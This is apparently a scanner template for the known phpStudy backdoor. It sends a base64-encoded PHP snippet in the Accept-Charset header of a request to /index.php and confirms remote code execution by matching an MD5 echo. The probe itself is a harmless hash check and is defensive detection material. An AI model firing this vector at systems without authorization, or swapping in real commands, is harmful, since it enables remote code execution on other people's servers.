expression: r0()
id: phpstudy-backdoor-rce
info:
  author: 17bdw
  name: Phpstudy backdoor rce
  severity: critical
rules:
  r0:
    expression: response.body.bcontains(bytes(md5(r)))
    request:
      headers:
        Accept-Charset: '{{payload}}'
        Accept-Encoding: gzip,deflate
      method: GET
      path: /index.php
set:
  payload: base64("printf(md5('" + r + "'));")
  r: randomLowercase(6)
